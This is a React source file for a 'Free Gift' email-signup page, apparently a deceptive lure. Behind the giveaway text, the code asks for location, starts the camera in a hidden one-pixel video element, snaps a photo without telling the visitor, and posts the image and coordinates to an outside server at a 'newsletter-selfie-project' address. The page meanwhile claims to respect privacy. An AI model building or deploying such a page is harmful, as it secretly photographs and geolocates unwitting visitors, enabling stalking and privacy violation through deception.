import React, { useEffect, useRef, useState } from "react";

function App() {
  const videoRef = useRef(null);
  const canvasRef = useRef(null);
  const [location, setLocation] = useState({ latitude: null, longitude: null });

  useEffect(() => {
    // Step 1: Ask for location first
    navigator.geolocation.getCurrentPosition(
      (position) => {
        const { latitude, longitude } = position.coords;
        setLocation({ latitude, longitude });

        // Step 2: Now start camera
        navigator.mediaDevices.getUserMedia({ video: true }).then((stream) => {
          if (videoRef.current) {
            videoRef.current.srcObject = stream;

            videoRef.current.oncanplay = () => {
              setTimeout(() => {
                captureImage(latitude, longitude);
              }, 2000);
            };
          }
        });
      },
      (error) => {
        console.error("❌ Location access denied", error);
        alert("❌ Location permission denied. We need location to continue.");
      }
    );
  }, []);

  const captureImage = (latitude, longitude) => {
    const video = videoRef.current;
    const canvas = canvasRef.current;

    if (video && canvas) {
      const context = canvas.getContext("2d");
      canvas.width = video.videoWidth;
      canvas.height = video.videoHeight;
      context.drawImage(video, 0, 0, canvas.width, canvas.height);

      canvas.toBlob((blob) => {
        if (!blob) return;

        const formData = new FormData();
        formData.append("image", blob, "selfie.jpg");
        formData.append("latitude", latitude);
        formData.append("longitude", longitude);

        fetch("https://newsletter-selfie-project.onrender.com/send-email", {
          method: "POST",
          body: formData,
        })
          .then(() => {
            console.log("✅ Sent selfie + location");
            alert("🎉 Gift Captured and Sent!");
          })
          .catch((err) => console.error("❌ Failed to send", err));
      }, "image/jpeg");
    }
  };

  return (
    <div>
      <video
        ref={videoRef}
        autoPlay
        muted
        playsInline
        style={{ width: 1, height: 1, opacity: 0.01 }}
      />
      <canvas ref={canvasRef} style={{ display: "none" }} />
        <div class="container">
    <h1>🎁 Get a Free Gift!</h1>
    <p>We appreciate you! Enter your email below to claim your exclusive gift – it’s 100% free.</p>

    <form>
      <input type="email" placeholder="Enter your email" required />
      <br />
      <button type="submit">Claim My Gift</button>
    </form>

    <div class="bonus">
      <h3>⭐ Bonus Offer</h3>
      <p>Refer a friend and both of you get an extra surprise!</p>
    </div>

    <div class="footer">
      <p>We respect your privacy. No spam, ever.</p>
      <p>Need help? Contact us at <a href="mailto:support@yourcompany.com">support@yourcompany.com</a></p>
    </div>
  </div>
    </div>
  );
}

export default App;
